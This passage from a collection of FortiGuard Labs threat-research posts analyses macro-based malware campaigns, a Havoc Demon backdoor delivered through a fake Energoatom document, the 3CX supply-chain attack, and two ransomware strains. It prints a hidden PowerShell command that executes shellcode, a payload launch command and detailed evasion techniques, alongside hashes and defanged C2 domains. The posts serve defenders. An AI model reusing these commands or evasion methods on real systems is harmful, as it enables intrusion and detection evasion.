are populated before calling the decoder function, and a size. The function has a loop with the provided size, and it uses a Mid function each time to find the proper character from the hardcoded string and append them together to build the string. The array of numbers shows which character needs to be selected. All function executions are performed by the CallByName function. This function executes a method of an object. The macro first decodes all the encoded URLs and then creates a file name to store the Emotet payload. The file name is also decoded, which is the machine's current time. For example, if the time is 12:25:23, the file name will be 122523.tmp. It then builds the required parameters for each URL and makes the HTTP request to get the Emotet payload. More specifically, it adds the current time (in the format used to create the .tmp file name) and a parameter to the end of the URL (usually, c=1). It performs the HTTP requests and checks on the status till it receives ‘200’, which means the server has responded. It then downloads the response body, which is a zip file, and saves it into the victim’s machine in the same location as the Word document is located. After that, it extracts the zip file and moves the contents of the archive file into that tmp file, whose name was created in the previous step. It then deletes both the zip file and the extracted directory. In the last step, it calls RegSvr32.exe to execute the payload. Gozi ISFB, also known as Ursnif, is a banking trojan that has been distributed through spam campaigns, exploit kits, and fake pages. Recently, this trojan has been distributed using various methods, such as .hta and .lnk files, but this trojan is also still being distributed using macro-based Excel documents. In a recent spam campaign onMarch 9th,they used archive files containing macro-embedded Excel files as attachments to spam emails to target users in Italy. The Excel document contains a macro that downloads and executes the Gozi payload. Enabling macros won’t activate the download execution since the primary function is executed when the end user clicks the “APRI (Open)” button. Clicking this button executes the “beneficiary” function. This function is simple. As you can see below, the download URL is encoded within the macro but has some numbers between each character. It then uses UrlDownloadToFileA to download the payload and save it into a .cvs file in the Document directory. It then uses the VBA.Shell function to execute the downloaded dll using rundll32. It also clears the cache of Internet Explorer using the Shell command. Donot APT, also known as APT-C-35 and SectorE02, is a threat actor targeting organizations and individuals in South Asia – specifically, Bangladesh, Sri Lanka, Pakistan, and Nepal – since at least 2016.  This actor relies on spear-phishing emails weaponized with malicious documents to target its victims. We have observed that the group still uses malicious documents to target its victims. We observed some maldocs being used by this actor in early 2023, and in this section, we will look at the most recent campaign run by this actor. Most of the maldocs we observed have a creation time of around 2021, but all were connected to domains created in the past 30 days. This suggests that the threat actor has reused maldocs previously made by them in their Feb and March 2023 campaign. The embedded macro uses a combination of lesser-known APIs to inject a shellcode inside the memory of the Microsoft Office: NtAllocateVitualMemory, WideCharToMulitBytes, and Internal_EnumUILanguages. The Internal_EnumUIlanguages API is used as a callback to execute the shellcode. These API calls bypass blacklist detections that detect known functions in VBA, such as Shell and Run functions. The injected shellcode connects to its C2s to get the next-stage payload. It also creates a scheduled task to make connections to its C2. Besides what we analyzed here, we have also seen a malicious Word document used by this actor sometime around Jan 17thof this year. Confucius is a threat actor primarily operating cyberespionage campaigns against Pakistan since 2013. This threat actor has used macro-based documents in its past campaigns and is still using the same method to initiate its current attacks. In one of their most recent operations, run in February of this year, they used macro-based documents to target the financial division of the government of Pakistan. The macro drops a text file into thePublic/Picturesdirectory and then creates a scheduled task service to execute the text file at a specific time. In fact, the dropped txt file is a shellcode that will be executed by calling PowerShell. powershell.EXE -w hidden iex([System.Text.Encoding]::ASCII).GetString((([string](get-content -path C:\\Users\\Public\\Pictures\\walpaper.jpeg.txt)).replace(' ','')).split(',')) SideCopy is a Pakistani threat actor primarily targeting India since at least 2019. The actor has used multiple methods. such as .lnk files, macro-based documents, and trojanized applications to initiate its attacks. In one of their most recent operations, they still used macro-embedded word documents to target the government of India. The macro is simple. Its execution starts when a user closes the document. It connects to its server to download the content of a payload in text format, which it then converts to an executable and stores in the Startup directory to be executed after a machine reboot. On March 1st, we identified a new malicious document that might have targeted Vietnamese users. The malicious document was weaponized with a macro, yet another example of threat actors that still rely on macro-embedded documents to initiate their attacks. The embedded macro drops an archive file that contains all the malicious files needed in this attack. The archive file contains batch scripts, PowerShell scripts, and dll files. In the next step, it moves its archive file into the APPDATA/Microsoft directory and unzips it. The dlls embedded within the archive file perform the primary malicious activities. The macro is only responsible for loading the right dll file according to the OS version and then calling its export function. The dll file is responsible for creating three scheduled tasks (Script_Update, Windows_Executor, Windows_Update) and executing them at specific time intervals. Each scheduled task executes one of the scripts embedded within the archive file. We also found another document associated with this actor that was uploaded to VirusTotal in December 2022. This may indicate that the actor has been active over the past few months. Besides what we have reported in the previous sections, we have also observed other actors still using macro-based documents to target their victims. Here are some of them: -    Kimsuky used a macro-based document to target Korean-speaking people. The maldoc deploys Quasar Rat. -      A threat actor targeted defense production factories in Pakistan in early February of this year. The actor used a macro-embedded Excel file to distribute its payload. Due to not having enough indicators, we are avoiding attributing this activity to any specific actor. The macro is not obfuscated. It just downloads the payload from the server and stores it in the Startup directory as Notepad.exe. This blog post provided an overview of threat actors still using macro-based Office documents. We showed several APT groups, such as Kimsuky, Donot, and SideCopy, and cyber-crime actors, such as Emotet, still relying on macro-based Office documents to initiate attacks and distribute their payloads. This research shows that although it has been over a year since Microsoft announced its intent to disable Internet macros, numerous threat actors still use those macros to distribute their malware. This suggests that security companies/people still need to be cautious about opening Office documents and update their software to the latest versions that block these macros by default. Fortinet customers are already protected from these APT and cyber-crime campaigns through FortiGuard’s AntiVirus, FortiMail, and FortiClient services, as follows: The following (AV) signatures detect the malicious documents mentioned in this blog: VBA/Valyria.7853!trVBA/Agent.CVE!trVBA/Agent.6412!trVBA/Agent.YSM!trVBA/Agent.AEC!trVBA/Agent.YEU!trVBA/Agent.YVG!trVBA/Emotet.RES!tr Fortinet has multiple solutions designed to help train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. We also suggest that organizations have their end users undergo our FREE NSE training:NSE 1 – Information Security Awareness. It includes a module on Internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks. If you think this or any other cybersecurity threat has impacted your organization, contact ourGlobal FortiGuard Incident Response Team. Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio. tactics techniques and procedures (TTP),microsoft FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/are-internet-macros-dead-or-alive"
  },
  {
    "title": "Malware Disguised as Document from Ukraine's Energoatom Delivers Havoc Demon Backdoor",
    "content": "FortiGuard Labs Threat Research Affected platforms:Microsoft WindowsImpacted parties:Targeted Windows usersImpact:Compromised machines are under the control of the threat actorSeverity level:Medium As part of our ongoing research on malware being used in the Russian-Ukrainian conflict, FortiGuard Labs has encountered a malicious spoofed document pretending to be from the Ukrainian company, Energoatom, a state-owned enterprise that operates Ukraine’s nuclear power plants. Since the war with Russia began, Ukraine’s energy sector has been under constantcyberattack. For example, in April 2022, anattackdeploying INDUSTROYER2 and CADDYWIPER wiper malware targeted energy companies. On 16 August 2022, the Energoatom corporate website was the target of a DDoS attack. And in October 2022, yet another wiper attack, this one using the wiper dubbed NikoWiper, targeted the energy sector. Aside from highlighting the technical details of this latest multi-staged attack, which includes several evasion techniques, this article also discusses some strange artifacts that make us think this could be a work-in-progress or part of a red-team exercise. The macro-enabled document is named “zatverdzhenniy_spisok_osib_na_otrim”, which roughly translates to “approved list of persons to receive” in Ukrainian. It arrives inside an ISO image archive bearing the same filename. It was first submitted to VirusTotal in mid-March of this year. When opened, it displays an image instructing the user to enable Word’s macro code execution to reveal information supposedly protected by M.E. Doc (My Electronic Document). This popular Ukrainian document management system is used to exchange important and sensitive documents with organizations (including regulatory authorities) in electronic form. Blurred content with the logo for Energoatom is displayed behind the instruction, making it appear to be protecting important information (Figure 1). In reality, it’s just an ordinary image placed on the top layer of the document. Dragging it to the side reveals the supposedly protected information underneath. Once the macro is enabled, the image disappears, creating the impression that the critical information has somehow been revealed. The document contains an announcement about a list of people supposedly approved to receive protective equipment (Figure 2). To complicate analysis and attempt to evade detection, the macro’s VBA code employs a few interesting techniques. The Word application crashes when trying to view or debug the VBA code in the document. Similarly, when the document composition is analyzed usingoletools(a package of python tools used to analyze Microsoft OLE2 files), the tool produces several errors, including stream files that have been defined but are not present within the archive. The tool also reports an error about an incorrect signature when attempting to decompress a specific stream inside the file. We have not confirmed if either of these anomalies directly led to the crash above. Nevertheless, oletools eventually extracted the complete malicious VBA macro code intended to be executed by the document. In a likely attempt to make the location of the macro code less obvious, the VBA Project binary file that contains the actual VBA code is redirected to the file “EbDYTPZ.vEypm” instead of the default “vbaProject.bin”.  This association is detailed in “word\\_rels\\ document.xml.rels” of the Office Open XML archive with the following line: “<Relationship Id=\"rId1\" Type=\"http://schemas.microsoft.com/office/2006/relationships/vbaProject\" Target=\"EbDYTPZ.vEypm\"/>” As usual, the VBA code is set to execute when the document is opened via AutoOpen and Document_Open events. As mentioned, the macro begins by deleting the overlay image, which is internally a Shape object with the Name attribute “happy”. To find this image, it iterates through all the Shape objects in the document and deletes the one with the same name. To hide the strings it uses during its execution, it primarily uses a simple encoding by subtracting 35 from each character of the original string and encoding the result with Base64. In addition, it uses other operations, such as string reverse and character splitting, prior to decoding. As an anti-debugging technique, execution of the primary infection routine uses theApplication.OnTimefunction commonly used to schedule the execution of a specific VBA procedure instead of directly calling it. In this case, it schedules the immediate execution of the function “ostrategicy”. When debugging, this line of code produces theerror, “Can’t execute code in break mode”, and then stops executing. As seen in Figure 3, seemingly random nonsensical comments are also added to the VBA code. This malware then checks if a hardcoded path, “C:\\Users\\user\\AppData\\Local\\Microsoft\\Office\\OfficeTelemetry.dll”, exists in the system. As discussed later, this is the same file path where the payload would be written. This strange implementation detail makes us think this may be a work in progress and could be a test sample created for a threat campaign that will soon be launched. The file at the abovementioned path is executed if it exists. Otherwise, the code extracts the payload that is cleverly stored as a node named “TwXfx” in a custom XML part of the document. Custom XML partsis a feature that was introduced with Office Open XML format. It is used for storing arbitrary data that the document could programmatically access. To get to the payload data, it starts by enumerating all the custom XML part objects in the document and then checking if they have a node named “TwXfx”. That node contains the encoded payload. Below is a screenshot of the encoded payload stored in “customXml\\item1.xml” of the document archive (Figure 4). Although the payload in this document is stored in a single node, the VBA code also supports an encoded payload split across several nodes, further complicating its extraction. In fact, before assuming that the data is stored in a single node, it first checks to determine whether it is stored in several nodes. It does this by trying to find the node name, in this case, “TwXfx”, with an appended index, i.e., “TwXfx_0”. If the node exists, it moves on to find the next one by incrementing the index (i.e., TwXfx_1). It repeats this until it fails to find a node, which means it has reached the end of the payload. Once a node is found, the content of the node is read, and its XML tags are removed. Furthermore, if a string “__b_” is found at the beginning of the data, it is also removed. Similar to decoding strings, the binary payload is extracted by decoding the data using Base64 and adding 35. Only this time, the resulting bytes are further decoded with xor 82. The decoded payload is a 64-bit executable (.exe). The storage of a payload binary as a custom XML part of the document is a technique very similar to what’s presented inthis blogfrom the website mgeeky.tech. Even on the code level, there are striking similarities between the code used by the malicious document and what’s presented in that blog. The website author offers a private tool that provides similar capabilities. Still, the creator of this malicious document could have easily replicated the technique from the publicly available PoC linked in the blog. Figure 5 shows one of the several code similarities observed in the function for locating the payload node in the document. Once the payload is decoded, it is written to the hardcoded path “C:\\Users\\user\\AppData\\Local\\Microsoft\\Office\\OfficeTelemetry.dll” and executed usingShellExecutewith the following command line: C:\\Windows\\System32\\conhost.exe --headless \"C:\\Users\\user\\AppData\\Local\\Microsoft\\Office\\OfficeTelemetry.dll\" \"” This eventually leads to the execution of a Havoc Demon agent, as discussed in the next section. Based on the filename of the payload binary, it tries to masquerade as a legitimate component of Microsoft Office. It is even signed with an invalid portal.office.com certificate (Figure 6). While this file has a DLL extension and contains multiple exports (Figure 7), it is a standalone EXE file. Upon execution, it locates a packed and compressed payload in the.vdatasection (Figure 8) of the memory allocated for the current process. The payload storage is structured as follows: 1.     Offset 0x0: Magic (8 bytes) 2.     Offset 0x8: Encrypted flag (0 = not encrypted, 3 = RC4 encryption) 3.     Offset 0x9: Compression flag (0 = not compressed, 3 = LZNT1 compression) 4.     Offset 0xa: RC4 key (64 bytes) 5.     0ffset 0x4a: Compressed size (4 bytes) 6.     Offset 0x4e: Uncompressed size (4 bytes) 7.     Offset 0x52: Loader configuration string length (2 bytes) 8.     Offset 0x154: Start of encrypted and compressed loader configuration and payload After decrypting and decompressing the payload, we see a pipe-delimited configuration followed by the actual shellcode to be executed (Figure 9). The loader configuration format is as follows: After parsing the configuration, this loader prepends a stub containing 79 bytes of junk instructions before the actual payload shellcode. The bytes at 25 hardcoded offsets within this stub are replaced with random bytes to hinder shellcode detection. It first ensures that a file within the %TEMP% does not exist before attempting to launch the payload. The name of this file is derived from a value computed from hour / 3 + year + month + day of the current time. Hence, the payload will only be executed up to 8 times per day. To launch the shellcode, the loader callsZwCreateThreadExto create a new suspended injection thread hidden from debuggers using theTHREAD_CREATE_FLAGS_CREATE_SUSPENDED(0x01) andTHREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER(0x4) thread creation flags. By removing theTHREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGERflag before theZwCreateThreadExcall and using memory breakpoints, the shellcode can be debugged in the usual manner when the thread resumes execution. While not enabled in this sample, the loader also supports sleep obfuscation to hinder detection by memory scanners. It does this by redirecting calls to the Windows Sleep API to its own function that performs the following: 1.     Suspends all threads in the current process 2.     Reverts the patched Sleep API code bytes 3.     Reverts patches to security APIs (only if patching was configured) 4.     Encodes sensitive memory regions in the current process with a randomized XOR key 5.     Calls Sleep with the specified timeout 6.     Decodes sensitive memory regions in the current process with the same XOR key 7.     Patches security-related APIs to disable them 8.     Patches Sleep to redirect to this function again 9.     Resumes all threads in the current process The patched APIs are: Interestingly, well-known Cobalt Strike configuration field names (Figure 10) are also found in plaintext within the sample, possibly to confuse static analysis tools. The second stage consists of a shellcode with a Havoc C2 agent DLL appended to it. Havoc C2 framework is an open-source post-exploitation toolkit developed by C5pider and comprises the following components: The shellcode looks for 0x4d 0x5a and 0x50 0x45 bytes that denote the “MZ\" and “PE” headers of a Windows PE executable file to locate the payload in memory. It then calls the loader (referred to internally as KaynLdr in thesource code) KaynLdr resolves theLdrLoadDll,ZwAllocateVirtualMemory,andNtProtectVirtualMemoryNative APIs via API hashing before using them to allocate memory, load the Demon agent payload, and execute it directly from memory. The relevant API hashes are: The DLL loaded by KaynLdr is the Havoc Demon agent, which is analogous to Beacon for the popular Cobalt Strike framework. The configuration is embedded within the Demon sample. Demon communicates with the C2 server specified in the configuration via HTTP or HTTPS POST requests. A randomized 256-bit key and 128-bit IV are generated and shared with the C2 server on the initial check-in request (Figure 11) for encrypting subsequent data communicated between the agent and C2 server with AES-256-CTR. The relevant fields in the check-in request are as follows: 1.     Size of data package 2.     Magic value: 0xDE 0xAD 0xBE 0xEF (hardcoded into Havoc) 3.     Agent ID 4.     Command ID: 0x63 (DEMON_INITIALIZE) 5.     32-byte AES key 6.     16-byte AES IV 7.     AES-encrypted data While Demon can be configured to rotate among multiple C2 domains, only one C2 domain, \"ukrtatnafta[.]org\", is specified for this sample. This domain is very similar to ukrtatnafta[.]com, owned by Ukrtatnafta, a Ukrainian oil refining company. To blend in with legitimate HTTP/HTTPS traffic, Demon randomly picks one of several URIs set in the configuration and applies a specified list of HTTP headers in the requests to the C2. The Teamserver C2 configuration extracted from this sample can be seen below. The major features of Demon include: As this Demon sample was unmodified from the version in Github, we will not analyze it in detail here. Interested readers may refer to thedocumentationandsource codeon GitHub. This malware campaign showcases some interesting techniques threat actors use to evade detection and hinder analysis. Using a combination of such techniques, threat actors may gain sufficient time to complete their post-exploitation commands upon successful infection before they are detected. Although the document contains some indicators of a potential red-team exercise, e.g., the hardcoded path for persisting the payload on disk and use of a relatively novel payload encoding technique, it is also entirely possible that this could be a campaign under development as many red-team tools have been weaponized recently for malicious purposes. As this document delivers a backdoor that will silently provide control over the infected user’s system to a remote operator with unknown intentions, it is safer to err on the side of caution and ensure protections are in place. The increasing use of open-source offensive security frameworks is a double-edged sword.  On the one hand, both red and blue teams can benefit from the availability of the source code to better understand how these techniques work, address detection gaps, and improve the cyber resilience of their organizations. On the other hand, it enables threat actors to abuse these frameworks to conduct attacks without developing or purchasing custom malware. FortiGuard AntiVirus detects the malicious files identified in this report as The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. The Fortinet AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. This type of threats is usually delivered as email attachments. FortiMail can detect and quarantine the malicious attachments for such campaigns. Fortinet’s CDR (Content Disarm and Reconstruction) service can neutralize the embedded macros inside the Word document. The FortiGuard Web Filtering Service detects the C2 URLs cited in this report as Malicious and blocks them. FortiGuard Labs providesBackdoor.Havoc.AgentIPS signature to block Havoc C2 network communications. Due to the ease of disruption, damage to daily operations, potential impact to an organization's reputation, and the unwanted destruction or release of PII, etc., it is important to keep all AV and IPS signatures up to date. We also suggest that organizations have their end users undergo our free NSE training:NSE 1 – Information Security Awareness. It includes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks. If you believe these or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. File Hashes b773fa65bb375e6fe6d387f301f6bf33219189ea1d4a06762e965a9eba7de4e8 17637fac7f989549acd248ca9e5293d2b9a1a2e4bb0f7e4edf5571df35129f0c 9f797d705facebd1687b7765cbf65231e71821eb3c38dcc171a3fc88b9f52328 b6cb8a7cdce0bfd3a7402d22fb0014dedb259d6c91c1538ac74097b8ca22ca5c C2 URLs hxxps://ukrtatnafta[.]org hxxps://ukrtatnafta[.]org/wp-content/themes/pressa/js/avias.js hxxps://ukrtatnafta[.]org/wp-content/themes/pressa/js/mobile_menu.js hxxps://ukrtatnafta[.]org/wp-content/plugins/contact-form-7/includes/js/scripts.js hxxps://ukrtatnafta[.]org/wp-content/themes/pressa/js/bootstrap.js hxxps://ukrtatnafta[.]org/wp-content/themes/pressa/js/hovermenu.js hxxps://ukrtatnafta[.]org/wp-content/themes/pressa/js/retina-1.1.0.js hxxps://ukrtatnafta[.]org/wp-content/plugins/js_composer/assets/lib/bower/isotope/dist/isotope.pkgd.min.js hxxps://ukrtatnafta[.]org/wp-content/themes/pressa/js/custom-script.js hxxps://ukrtatnafta[.]org/wp-includes/js/wp-emoji-release.min.js hxxps://ukrtatnafta[.]org/maps-api-v3/api/js/52/1/intl/uk_ALL/util.js hxxps://ukrtatnafta[.]org/wp-includes/js/wp-embed.min.js FortiGuards Labs,ukraine,malware analysis FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/malware-disguised-as-document-ukraine-energoatom-delivers-havoc-demon-backdoor"
  },
  {
    "title": "3CX Desktop App Compromised (CVE-2023-29059)",
    "content": "FortiGuard Labs Threat Research This is a developing story. Please check back for the latest updates from FortiGuard Labs. For a report of this event, please visit ourThreat Signal Reportspage. OnMarch 29, a number of reports surfaced thata legitimate signed file from VoIP/IP PBX solutions provider 3CX (3CXDesktop App) had been trojanized due to a code-level compromise. This is the latest high-profilesupply chain attack, beginning with SolarWinds and Kaseya a few years ago. This issue has been assignedCVE-2023-29059. 3CXDesktop App is a multi-platform softphone application for desktops (Linux, MacOS, and Windows). The 3CXDesktop App allows users to interact via chat, messaging, video, and voice. Initial reports suggested that all platforms of the 3CXDesktop App were compromised. But at the time of writing, it appears that only the Electron framework versions of MacOS (versions 18.11.1213, 18.12.402, 18.12.407, and 18.12.416) and Windows (versions 18.12.407 and 18.12.416) of the 3CX Desktop App areaffected.  3CX has stated that they are working on a new version of the Windows app and have revoked the certificate for the previous version. Initially, there was some confusion about whether the MacOS version was affected, as the CEO of 3CX issued a statement that only the Windows version of the app was affected. However, this statement was laterretracted. Currently, no status on the availability of the MacOS version has been provided at the time of writing. The company’s website boasts that 3CX is available in over 190 countries worldwide, with over 12 million daily users and a 600,000-plus customer base. Companies listed on its website include high-profile organizations in the automobile, aerospace, finance, food and beverage, government, hospitality, and manufacturing sectors, to name a few. The trojanized 3CX Desktop App is part of a multi-stage attack that utilizes a malicious sideloaded DLL (ffmpeg.dll - SHA256: 7986bbaee8940da11ce089383521ab420c443ab7b15ed42aed91fd31ce833896) that contains instructions and a payload within another DLL via an encrypted blob (d3dcompiler_47.dll – SHA256: 11be1803e2e307b647a8a7e02d128335c448ff741bf06bf52b332e0bbf423b03). This blob also contains the shellcode, which tries to pull ICO files from GitHub (currently down) that contain various URIs for download, where the payload is ultimately loaded and installed to the target environment. However, we could not confirm further details as the repository is currently down. Looking at the Windows installer (SHA256:aa124a4b4df12b34e74ee7f6c683b2ebec4ce9a8edcf9be345823b4fdcf5d868), it drops TWO 3CXDesktopApp.exe files. The SECOND (inside app-18.12.407 folder) is the one that sideloads the ffmpeg.dll file. C:\\Users\\Admin\\AppData\\Local\\Programs\\3CXDesktopApp\\3CXDesktopApp.exe Filesize: 541KB MD5: 08d79e1fffa244cc0dc61f7d2036aca9 SHA1: 480dc408ef50be69ebcf84b95750f7e93a8a1859 SHA256: 54004dfaa48ca5fa91e3304fb99559a2395301c570026450882d6aad89132a02 C:\\Users\\Admin\\AppData\\Local\\Programs\\3CXDesktopApp\\app-18.12.407\\3CXDesktopApp.exe Filesize: 142MB MD5: bb915073385dd16a846dfa318afa3c19 SHA1: 6285ffb5f98d35cd98e78d48b63a05af6e4e4dea SHA256: dde03348075512796241389dfea5560c20a3d2a2eac95c894e7bbed5e85a0acc Below is a heat map based on recent connections to known malicious domains associated with this attack that FortiGuard Labs observed at the time of writing (March 31st, 2023): Based on our telemetry, we see that the top 10 countries highlight the geographic spread of victim machines calling out to known actor controlled infrastructure; which appears to target European and North American victims more: The following chart reveals a regional breakdown that further proves this point as close to 80 percent of the connections to the attacker controlled infrastructure are concentrated in Europe and North America.This may indicate that the threat actor is mainly targeting enterprises in those regions – however, this is uncertain. This could be indicative of 3CX product's geographic customer base - including the possibility of various multinational corporations operating inside those regions. 3CXsuggeststhat users migrate to the PWA app in the meantime. The PWA app is web-based and is unaffected by the supply chain attack. Customers on 3CXHosted and StartUP are not affected. Additional details on updates and best practices can be foundhere. FortiGuard Labs suggests that all older variants of the 3CX Desktop App be discontinued immediately until newer unaffected versions are available. Fortinet Customers running the latest definitions are protected by the following AV signatures: W64/Agent.CFM!tr OSX/Agent.CN!tr Riskware/Sphone_XC3 All known network IOCs related to this attack are blocked by the WebFiltering client. For a detailed overview of all Fortinet protections for this event, please visit ourOutbreak Alerts page. aa124a4b4df12b34e74ee7f6c683b2ebec4ce9a8edcf9be345823b4fdcf5d868 SHA2 Riskware/Sphone_XC3 59e1edf4d82fae4978e97512b0331b7eb21dd4b838b850ba46794d9c7a2c0983 SHA2 Riskware/Sphone_XC3 92005051ae314d61074ed94a52e76b1c3e21e7f0e8c1d1fdd497a006ce45fa61 SHA2 Riskware/Sphone_XC3 5407cda7d3a75e7b1e030b1f33337a56f293578ffa8b3ae19c671051ed314290 SHA2 OSX/Agent.CN!tr b86c695822013483fa4e2dfdf712c5ee777d7b99cbad8c2fa2274b133481eadb SHA2 Riskware/Sphone_XC3 e6bbc33815b9f20b0cf832d7401dd893fbc467c800728b5891336706da0dbcec SHA2 Riskware/Sphone_XC3 11be1803e2e307b647a8a7e02d128335c448ff741bf06bf52b332e0bbf423b03 SHA2 W64/Agent.CFM!tr 7986bbaee8940da11ce089383521ab420c443ab7b15ed42aed91fd31ce833896 SHA2 Riskware/Sphone_XC3 c485674ee63ec8d4e8fde9800788175a8b02d3f9416d0e763360fff7f8eb4e02 SHA2 Riskware/Sphone_XC3 b5e318240401010e4453e146e3e67464dd625cfef9cd51c5015d68550ee8cc09 SHA2 W64/Agent.CFM!tr aa4e398b3bd8645016d8090ffc77d15f926a8e69258642191deb4e68688ff973 SHA2 W64/Sphone_XC3.INFS!tr.dldr a64fa9f1c76457ecc58402142a8728ce34ccba378c17318b3340083eeb7acc67 SHA2 Riskware/Sphone_XC3 dde03348075512796241389dfea5560c20a3d2a2eac95c894e7bbed5e85a0acc SHA2 Riskware/Sphone_XC3 fad482ded2e25ce9e1dd3d3ecc3227af714bdfbbde04347dbc1b21d6a3670405 SHA2 Riskware/Sphone_XC3 FortiEDR detects installation of the 3CX Desktop App with a dynamic code exception event: FortiEDR also blocks the final payload making a network connection to C2: FortiGuard Labs has released a new Application Control signature that will detect attempted 3CX access activity which was released in definitions set (23.528): Regarding FortiAnalyzer, a knowledge base article that contains detailed insight on how to detect activities related to the 3CX Supply Chain attack can be foundhere. akamaicontainer[.]com akamaitechcloudservices[.]com azuredeploystore[.]com azureonlinecloud[.]com azureonlinestorage[.]com dunamistrd[.]com glcloudservice[.]com journalide[.]org msedgepackageinfo[.]com msstorageazure[.]com msstorageboxes[.]com officeaddons[.]com officestoragebox[.]com pbxcloudeservices[.]com pbxphonenetwork[.]com pbxsources[.]com qwepoi123098[.]com sbmsa[.]wikisourceslabs[.]com visualstudiofactory[.]com zacharryblogs[.]com azureonlinestorage.com convieneonline[.]com Soyoungjun[.]com FortiGuards Labs FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/3cx-desktop-app-compromised"
  },
  {
    "title": "Ransomware Roundup – Dark Power and PayMe100USD Ransomware",
    "content": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This latest edition of the Ransomware Roundup covers the Dark Power and PayME100USD ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts files on the compromised machine and demands ransom for file decryptionSeverity level:High Overview Dark Power is a relatively new ransomware launched in early February 2023. This is a rare ransomware breed in that it was written in the Nim programming language. Dark Power Ransomware Infection Vector Information on the infection vector used by this group is not currently available. However, it is not likely to differ significantly from other ransomware groups. Dark Power Ransomware Execution Once the Dark Power ransomware is executed, it terminates the following processes to encrypt files that are presently in use: taskmgr.exe, encsvc.exe, powerpnt.exe, ocssd.exe, steam.exe, isqlplussvc.exe, outlook.exe, sql.exe, ocomm.exe, agntsvc.exe, mspub.exe, onenote.exe, winword.exe, thebat.exe, excel.exe, mydesktopqos.exe, ocautoupds.exe, thunderbird.exe, synctime.exe, infopath.exe, mydesktopservice.exe, firefox.exe, oracle.exe, sqbcoreservice.exe, dbeng50.exe, tbirdconfig.exe, msaccess.exe, visio.exe, dbsnmp.exe, wordpad.exe, xfssvccon.exe It also stops the following services: veeam, memtas, sql, mssql, backup, vss, Sophos, svc$, mepocs The ransomware then encrypts files and appends a “.dark_power” extension to the affected files. It avoids encrypting files and directories with the following extensions: .lib, .pack, .search-ms, .dat, .ini, .regtrans-ms, .vhdx, .ps1, .log2, .log1, .blf, .ldf, .lock, .theme, .msi, .sys, .wpx, .cpl, .adv, .msc, .scr, .bat, .key, .ico, .dll, .hta, .deskthemepack, .nomedia, .msu, .rtp, .msp, .idx, .ani, .386, .diagcfg, .bin, .mod, .ics, .com, .hlpF, .spl, .nls, .cab, .exe, .diagpkg, .icl, .ocx, .rom, .prf, .themepack, .msstyles, .lnk, .icns, .mpa, .drv, .cur, .diagcab, .cmd, .shs, readme.pdf (file name used for ransom note dropped by Dark Power ransomware), ef.exe (file name used for Dark Power ransomware), ntldr, thumbs.db, bootsect.bak, autorun.inf, ntuser.dat.log, boot.ini, iconcache.db, bootfont.bin, ntuser.dat, ntuser.ini, desktop.ini, program files, appdata, mozilla, $windows.~ws, application data, $windows.~bt, google, $recycle.bin, windows.old, programdata, system volume information, program files (x86), boot, tor browser, windows, intel, perflogs, msocache Once files have been encrypted, Dark Power drops a lengthy ransom note as a “readme.pdf”, as seen in Figure 1. The ransom note threatens victims that unless they send 10,000 USD worth of Monero (XMR) cryptocurrency to the attacker’s wallet within 72 hours, their encrypted files will be lost forever. During our research, we did not see the Dark Power ransomware delete volume shadow copies of the affected machine. As a result, such encrypted files are potentially recoverable. Note that the ransomware stops the Volume Shadow Copy (VSS) service before encrypting files. As such, files not written to a Volume Shadow Copy before the ransomware encrypted them are not recoverable from a backup created through the VSS. The ransom note also claims that the Dark Power threat actor stole data from the compromised machine, which will be published to its leak site on Tor if a ransom is not paid. At the time of this investigation, the leak site listed ten companies in various industries from nine countries in North America, Europe, and Africa. Stolen data does not appear to be kept on the leak site. The site claims that the attacker will share the file location once contacted via qTox. Overview PayMe100USD is a new ransomware written in Python that was discovered in March 2023. The malware has basic functionality and performs ordinary ransomware activities. PayMe100USD Ransomware Infection Vector The PayMe100USD ransomware samples that FortiGuard Labs collected have a Microsoft Bing logo and a file name of “newbing.exe”. As such, the ransomware was likely distributed via fake Bing installers. PayMe100USD Ransomware Execution Once the PayMe100USD ransomware is executed, it encrypts files in the D, E, and F drives and the user directory in the C drive. It adds a “.PayMe100USD” file extension to the affected files. The ransomware avoids encrypting files with the following file extensions: .py, .pem, .exe, .mp4, .mkv, .payme100usd (file extensions of the files encrypted by PayMe100USD ransomware) , .iso The ransomware then drops eight ransom notes, labeled “PayMe   1.txt” to “PayMe    8.txt”. Although the last number in the file names differ, all ransom notes are identical. The ransom notes ask victims to pay 100 USD worth of Bitcoin within 48 hours to recover the affected files and stop the alleged stolen data from being sold on the dark web. Fortinet customers are already protected from this malware variant through FortiGuard’s Web Filtering, AntiVirus, and FortiEDR services, as follows: FortiGuard Labs detects known Dark Power ransomware variants with the following AV signatures: FortiGuard Labs detects known PayMe100USD ransomware variants with the following AV signature: File-based IOCs: SHA256 Malware 33c5b4c9a6c24729bb10165e34ae1cd2315cfce5763e65167bd58a57fde9a389 Dark Power ransomware 11ddebd9b22a3a21be11908feda0ea1e1aa97bc67b2dfefe766fcea467367394 Dark Power ransomware 